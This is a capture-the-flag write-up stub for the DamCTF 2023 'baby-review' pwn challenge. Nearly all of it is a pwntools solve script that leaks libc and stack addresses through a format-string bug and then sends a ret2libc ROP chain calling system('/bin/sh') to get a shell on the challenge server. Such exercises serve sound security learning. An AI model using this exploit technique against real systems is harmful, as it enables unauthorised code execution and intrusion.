# baby-review (pwn)

Full writeup here: https://rektedekte.github.io/CTF-writeups/DamCTF%202023/baby-review/

Our solve script:
```py
from pwn import *

local = False

elf = context.binary = ELF("./baby-review_patched")
libc = ELF("./libc.so.6")

if local:
    context.gdbinit = "~/tools/peda/peda.py"
    # conn = gdb.debug("./baby-review_patched", '''
    # b *(&menu+108)
    # c
    # ''')

    conn = process("./baby-review_patched")

else:
    conn = connect("chals.damctf.xyz", 30888)

print(conn.recvuntil(b"?\n"))
conn.sendline(input("-> ").encode())

conn.recvuntil(b"Exit\n")
conn.sendline(b"5")

conn.recvuntil(b"list\n")
conn.sendline(b"%3$p %7$p")  # libc pointer and stack pointer

conn.recvuntil(b"Exit\n")
conn.sendline(b"2")

conn.recvuntil(b"EE\n")
leak = conn.recvline()[:-1]  # Leak
libc_leak, stack_leak = leak.split(b" ")
libc_leak = eval(libc_leak)  # libc pointer
stack_leak = eval(stack_leak) + 0x130 - 8  # stack pointer

libc.address = libc_leak - libc.sym["write"] - 16 - 7

print(f"Leaked libc base {hex(libc.address)}")
print(f"Leaked pivot address {hex(stack_leak)}")

conn.recvuntil(b"Exit\n")
conn.sendline(b"4")  # Exit

payload = p64(libc.address + 0x2a3e5)  # pop rdi
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.sym["system"])
payload += p64(0)
payload += p64(stack_leak)
payload += p64(libc.address + 0x562ec)

conn.recvuntil(b"?\n")
conn.sendline(payload)

conn.interactive()
```